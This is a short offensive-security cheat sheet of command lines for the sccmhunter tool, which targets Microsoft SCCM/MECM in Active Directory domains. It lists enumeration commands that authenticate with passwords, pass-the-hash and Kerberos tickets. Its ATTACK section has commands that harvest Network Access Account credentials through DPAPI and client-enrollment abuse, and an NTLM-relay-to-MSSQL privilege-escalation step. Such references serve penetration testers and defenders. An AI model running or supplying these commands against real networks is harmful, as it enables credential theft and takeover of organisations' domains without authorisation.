# sccmhunter

% sccm, mecm
#plateform/linux  #target/remote #cat/RECON 

## desc
```
https://github.com/garrettfoster13/sccmhunter
https://github.com/garrettfoster13/sccmhunter/wiki

.sccmhunter/logs/db/find.db
to install set dependencies on last version (i.e remove version in requirements.txt)

```

##  enum - ldap (creds)
```bash
python3 sccmhunter.py find -debug  -u <user> -p <password> -d <domain_fqdn> -dc-ip <dc_fqdn>
```

##  enum - ldap (pth)
```bash
python3 sccmhunter.py find -debug  -u <user> -hashes :<nt_hash> -d <domain_fqdn> -dc-ip <dc_fqdn>
```

##  enum - ldap (ptt)
```bash
KRB5CCNAME=<ccache>  python3 sccmhunter.py find -debug  -u <user> -no-pass -k -d <domain_fqdn> -dc-ip <dc_fqdn>
```

## enum - smb (creds)
```bash
python3 sccmhunter.py smb -debug  -u <user> -p <password> -d <domain_fqdn> -dc-ip <dc_fqdn>
```

## show - all
```bash
python3 sccmhunter.py show  -all
```


#cat/ATTACK 

## harvest naa - DPAPI (cred local admin)
```bash
python3 sccmhunter.py dpapi -debug  -u <user>  -p '<password>' -target <target_ip>
```


## harvest naa - DPAPI (pth local admin)
```bash
python3 sccmhunter.py dpapi -debug  -u <user>  -hashes :<nt_hash> -target <target_ip>
```

## harvest naa - http (abuse client enrollment)
```bash
python3 sccmhunter.py http -debug  -u <user> -p '<password>' -d <domain_fqdn> -mp <sccm_fqdn> -dc-ip <dc_fqdn> -sleep <sleep|10> -auto
```

## privesc - ntlmrelay to mssql helper
```bash
python3 sccmhunter.py mssql -stacked -d <domain_fqdn -dc-ip <dc_fqdn> -tu <target_user> -sc <sccm_site_code> -u <user> -p '<password>'
```